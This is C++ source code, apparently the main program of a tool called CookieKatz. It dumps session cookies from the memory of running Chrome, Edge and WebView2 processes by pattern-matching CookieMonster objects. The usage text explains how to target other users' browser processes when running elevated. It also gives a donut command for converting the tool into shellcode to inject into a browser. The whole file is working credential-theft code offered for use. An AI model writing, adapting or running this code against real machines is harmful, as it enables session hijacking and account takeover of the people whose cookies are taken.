#include <Windows.h>
#include <shlwapi.h>
#include <Shlobj.h>

#include "Helper.h"
#include "Process.h"
#include "Memory.h"
#include "Version.h"

void banner(HANDLE hFile) { //This is important
    PRINT(hFile, " _____             _    _      _   __      _       \n");
    PRINT(hFile, "/  __ \\           | |  (_)    | | / /     | |      \n");
    PRINT(hFile, "| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
    PRINT(hFile, "| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
    PRINT(hFile, "| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
    PRINT(hFile, " \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
    PRINT(hFile, "By Meckazin                     github.com / Meckazin \n");
};

void usage(HANDLE hFile) {
    PRINT(hFile, "Help!\n\n");
    PRINT(hFile, "Examples:\n");
    PRINT(hFile, ".\\CookieKatz.exe\n");
    PRINT(hFile, "    By default targets first available Chrome process\n");
    PRINT(hFile, ".\\CookieKatz.exe /edge\n");
    PRINT(hFile, "    Targets first available Edge process\n");
    PRINT(hFile, ".\\CookieKatz.exe /pid:<pid>\n");
    PRINT(hFile, "    Attempts to target given pid, expecting it to be Chrome\n");
    PRINT(hFile, ".\\CookieKatz.exe /webview /pid:<pid>\n");
    PRINT(hFile, "    Targets the given msedgewebview2 process\n");
    PRINT(hFile, ".\\CookieKatz.exe /list /webview\n");
    PRINT(hFile, "    Lists available webview processes\n");
    PRINT(hFile, ".\\CookieKatz.exe /inject\n");
    PRINT(hFile, "    Targets the current process. Use this flag when your are injecting CookieKatz to Chrome process.\n");
    PRINT(hFile, "\n");
    PRINT(hFile, "TIP! If you need to inject CookieKatz into the Chrome process, you can turn the exe into shellcode using donut:\n");
    PRINT(hFile, "    .\\donut.exe -a 2 --input <Path_to_CookieKatz.exe> -z 4 -b 1 -p \"/inject\" -t\n");
    PRINT(hFile, "\n");
    PRINT(hFile, "Flags:\n");
    PRINT(hFile, "    /edge       Target current user Edge process\n");
    PRINT(hFile, "    /webview    Target current user Msedgewebview2 process\n");
    PRINT(hFile, "    /pid        Attempt to dump given pid, for example, someone else's if running elevated\n");
    PRINT(hFile, "    /list       List targettable processes, use with /edge or /webview to target other browsers\n");
    PRINT(hFile, "    /inject     Indicate that the process will run in the target process\n");
    PRINT(hFile, "    /out        Write output to file, default location is: C:\\Users\\Public\\Documents\\cookies.log \n");
    PRINT(hFile, "    /help       This what you just did! -h works as well\n");
}

#pragma comment(lib,"shlwapi.lib")
int main(int argc, char* argv[]) {

#ifndef _WIN64
    PRINT("[-] 32bit version is not currently supported.\n");
    return 1;
#endif // !_WIN64

    Process processObj = Process();
    BOOL inject = false;
    BOOL ProcessList = FALSE;
    DWORD pid = 0;
    PSTR outFile = new char[MAX_PATH];
    memset(outFile, 0, MAX_PATH);

    //Jump over the program name
    for (size_t i = 1; i < argc; i++)
    {
        if (StrStrIA(argv[i], "pid:") != NULL)
        {
            //Split and take pid
            const char* colonPos = strchr(argv[i], ':');
            size_t pidLen = strlen(colonPos + 1);
            char* remainder = new char[pidLen + 1];
            strcpy_s(remainder, pidLen + 1, colonPos + 1);
            if (SSCAN(remainder, "%lu", &pid) == 0) {
                PRINT(processObj.GetFileHandle(), "[-] Failed to parse command line argument /pid!\n");
                return 1;
            }
        }
        if (StrStrIA(argv[i], "out") != NULL) {
            if (StrStrIA(argv[i], "out:") != NULL) {
                const char* colonPos = strchr(argv[i], ':');
                size_t pathLen = strlen(colonPos + 1) + sizeof(wchar_t);
                strcpy_s(outFile, pathLen, colonPos + 1);
            }
            else {
                if (FAILED(SHGetFolderPathA(NULL, CSIDL_COMMON_DOCUMENTS, NULL, 0, outFile))) {
                    PRINT(processObj.GetFileHandle(), "[-] Failed to get the FOLDERID_PublicDocuments path\n");
                    return 1;
                }
            }
            HANDLE hFile = nullptr;
            if (!CreateOutputFile(outFile, &hFile)) {
                PRINT(processObj.GetFileHandle(), "[-] Failed to create the output file: %s\n", outFile);
                return 1;
            }
            processObj.SetFileHandle(hFile);
        }
        if (StrStrIA(argv[i], "inject") != NULL)
            inject = true;
        if (StrStrIA(argv[i], "edge") != NULL)
            processObj.targetConfig = Edge;
        if (StrStrIA(argv[i], "webview") != NULL)
            processObj.targetConfig = Webview2;
        if (StrStrIA(argv[i], "list") != NULL)
            ProcessList = TRUE;
        if (StrStrIA(argv[i], "help") != NULL || StrStrIA(argv[i], "-h") != NULL) {
            banner(processObj.GetFileHandle());
            usage(processObj.GetFileHandle());
            return 0;
        }
    }

    //File output is forced when injecting
    //Or else you would never know what happens
    if (inject && processObj.GetFileHandle() == nullptr) {        
        //Flag /out was not given use the default path
        if (strlen(outFile) == 0) {
            HANDLE hFile = nullptr;
            outFile = new char[MAX_PATH];
            if (FAILED(SHGetFolderPathA(NULL, CSIDL_COMMON_DOCUMENTS, NULL, 0, outFile))) {
                PRINT(processObj.GetFileHandle(), "[-] Failed to get the FOLDERID_PublicDocuments path\n");
                return 1;
            }
            if (!CreateOutputFile(outFile, &hFile)) {
                PRINT(processObj.GetFileHandle(), "[-] Failed to get the create the output file: %s\n", outFile);
                return 1;
            }
            processObj.SetFileHandle(hFile);
        }
    }

    banner(processObj.GetFileHandle());
    PRINT(processObj.GetFileHandle(), "Kittens love cookies too!\n\n");

    //If some PID was given
    if (pid != 0 && inject == false)
    {
        if (!processObj.GetProcessHandle(pid))
        {
            PRINT(processObj.GetFileHandle(), "[-] Failed to get process handle to PID: %lu\n",pid);
            return 1;
        }
        if (!processObj.GetProcessName())
        {
            PRINT(processObj.GetFileHandle(), "[-] Failed to get process handle to PID: %lu\n", pid);
            return 1;
        }

        if (processObj.IsWow64())
        {
            PRINT(processObj.GetFileHandle(), "[-] Target process is 32bit. Only 64bit browsers are supported!\n");
            processObj.~Process();
            return 1;
        }
    }

    if (inject) {
        processObj.SetPrivateHandle(GetCurrentProcess());
        pid = GetCurrentProcessId();

        if (!processObj.GetProcessName()) {
            PRINT(processObj.GetFileHandle(), "[-] Failed to get process handle to PID: %lu\n", pid);
            return 1;
        }
    }

    //0xAA is a wild card that matches any byte
    //Pattern is the implementation of the function net::CookieMonster::~CookieMonster(void)
    //We use that to find the contents of Virtual Function Pointer struct (__vfptr)
    //Each instance of CookieMonster comes with one
    LPCWSTR targetProcess = L"\0";
    LPCWSTR targetDll = L"\0";

    if (processObj.targetConfig == Chrome || processObj.targetConfig == OldChrome || processObj.targetConfig == Chrome124)
    {
        PRINT(processObj.GetFileHandle(), "[*] Targeting Chrome\n");
        targetProcess = L"chrome.exe";
        targetDll = L"chrome.dll";
    }
    else if (processObj.targetConfig == Edge || processObj.targetConfig == OldEdge || processObj.targetConfig == Webview2)
    {
        if (processObj.targetConfig == Webview2) {
            PRINT(processObj.GetFileHandle(), "[*] Targeting Webview2\n");
            targetProcess = L"msedgewebview2.exe";
            targetDll = L"msedge.dll";
        }
        else {
            PRINT(processObj.GetFileHandle(), "[*] Targeting Edge\n");
            targetProcess = L"msedge.exe";
            targetDll = L"msedge.dll";
        }
    }
    else {
        PRINT(processObj.GetFileHandle(), "[-] Unknown config\n");
        return 0;
    }

    if (ProcessList)
    {
        PRINT(processObj.GetFileHandle(), "[*] Listing targetable processes\n");
        processObj.FindAllSuitableProcesses(targetProcess);
        PRINT(processObj.GetFileHandle(), "[+] Done\n");
        processObj.~Process();
        return 0;
    }

    //If pid was not given, now we go and find the process and handle
    if (pid == 0 && inject == false)
    {
        if (!processObj.FindCorrectProcessPID(targetProcess, &pid))
        {
            PRINT(processObj.GetFileHandle(), "[-] Failed to find right process\n");
            processObj.~Process();
            return 1;
        }

        if (processObj.IsWow64())
        {
            PRINT(processObj.GetFileHandle(), "[-] Target process is 32bit. Only 64bit browsers are supported!\n");
            processObj.~Process();
            return 1;
        }
    }
#ifdef _DEBUG
    PRINTW(processObj.GetFileHandle(), TEXT("[*] Targeting process PID: %d\n"), pid);
#endif

    //Versions and configs
    // 131.0.6778.0 >= Chrome
    // 125.0.6388.0 >= Chrome130
    // 125.0.6387.0 <= Chrome124
    // 124.0.6329.0 >= Chrome124
    // 124.0.6328.0 <= OldChrome

    //131.0.2903 >= Edge
    //124.0.2478 >= Edge130
    //124.0.2478 < OldEdge
    //I couldn't test that at what point Edge CanonicalCookie class was updated
    //So for now Edge doesn't support certain versions
    //Same goes for msedgewebivew2

    BrowserVersion browserVersion = { 0 };
    if (!GetBrowserVersion(processObj.GetPrivateHandle(), browserVersion, processObj.GetFileHandle())) {
        PRINT(processObj.GetFileHandle(), "[-] Failed to determine browser version!");
        return 0;
    }

    //Update config based on target version
    if (processObj.targetConfig == Chrome) {
        if (browserVersion.highMajor >= 131 && browserVersion.highMinor >= 6778)
            processObj.targetConfig = Chrome;
        else if ((browserVersion.highMajor <= 131 && browserVersion.highMinor < 6778) &&
            (browserVersion.highMajor >= 125 && browserVersion.highMinor > 6387))
            processObj.targetConfig = Chrome130;
        else if ((browserVersion.highMajor == 125 && browserVersion.highMinor <= 6387) ||
            (browserVersion.highMajor == 124 && browserVersion.highMinor >= 6329))
            processObj.targetConfig = Chrome124;
        else if (browserVersion.highMajor <= 124 ||
            (browserVersion.highMajor == 124 && browserVersion.highMinor < 6329))
            processObj.targetConfig = OldChrome;
    }
    else if (processObj.targetConfig == Edge || processObj.targetConfig == Webview2) {
        if (browserVersion.highMajor >= 131 && browserVersion.highMinor >= 2903)
            processObj.targetConfig = Edge;
        else if ((browserVersion.highMajor <= 131 && browserVersion.highMinor < 2903) ||
            (browserVersion.highMajor > 124))
            processObj.targetConfig = Edge130;
        else if (browserVersion.highMajor <= 124 ||
            (browserVersion.highMajor == 124 && browserVersion.highMinor < 2478))
            processObj.targetConfig = OldEdge;
    }

    //One pattern to rule them all
    size_t szPattern = 192;
    BYTE pattern[] = {
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    uintptr_t chromeDlladdress = 0;
    DWORD modulesize = 0;
    if (!processObj.GetRemoteModuleBaseAddress(targetDll, chromeDlladdress, &modulesize))
    {
        PRINT(processObj.GetFileHandle(), "[-] Failed to find target DLL\n");
        processObj.~Process();
        return 0;
    }

    Memory memoryObj = Memory(
        processObj.GetPrivateHandle(),
        processObj.targetConfig,
        inject,
        processObj.GetFileHandle()
    );
#ifdef _DEBUG
    PRINTW(processObj.GetFileHandle(), L"[+] Found %ls in address: 0x%p\n", targetDll, (void*)chromeDlladdress);
#endif
    uintptr_t targetSection = 0;
    if (!memoryObj.FindLargestSection(chromeDlladdress, targetSection)) {
        PRINT(processObj.GetFileHandle(), "[-] Something went wrong");
        processObj.~Process();
        return 0;
    }

#ifdef _DEBUG
    PRINTW(processObj.GetFileHandle(), L"[+] Found target region in section: 0x%p\n", (void*)targetSection);
#endif
    BYTE chromeDllPattern[sizeof(uintptr_t)];
    ConvertToByteArray(targetSection, chromeDllPattern, sizeof(uintptr_t));

    //Patch in the base address
    memoryObj.PatchPattern(pattern, chromeDllPattern, 8);
    memoryObj.PatchPattern(pattern, chromeDllPattern, 160);

    uintptr_t* CookieMonsterInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 1000);
    size_t szCookieMonster = 0;
    if (CookieMonsterInstances == NULL || !memoryObj.FindPattern(pattern, szPattern, CookieMonsterInstances, szCookieMonster))
    {
        PRINT(processObj.GetFileHandle(), "[-] Failed to find pattern\n");
        processObj.~Process();
        free(CookieMonsterInstances);
        return 0;
    }

    PRINTW(processObj.GetFileHandle(), TEXT("[*] Found %Iu instances of CookieMonster!\n"), szCookieMonster);
#ifdef _DEBUG
    for (size_t i = 0; i < szCookieMonster; i++)
        PRINTW(processObj.GetFileHandle(), TEXT("[*] Found CookieMonster on 0x%p\n"), (void*)CookieMonsterInstances[i]);
#endif

    //I don't know that the first instance of the CookieMonster is supposed to be, but the CookieMap for it seems to always be empty
    //Each incognito window will have their own instance of the CookieMonster, and that is why we need to find and loop them all
    for (size_t i = 0; i < szCookieMonster; i++)
    {
        if (CookieMonsterInstances == NULL || CookieMonsterInstances[i] == NULL)
            break;
        uintptr_t CookieMapOffset = 0x28; //This offset is fixed since the data just is there like it is
        CookieMapOffset += CookieMonsterInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
#ifdef _DEBUG
        PRINTW(processObj.GetFileHandle(), TEXT("[*] CookieMap should be found in address 0x%p\n"), (void*)CookieMapOffset);
#endif
        memoryObj.WalkCookieMap(CookieMapOffset);
    }

    free(CookieMonsterInstances);

    PRINT(processObj.GetFileHandle(), "[+] Done\n");
    return 0;
}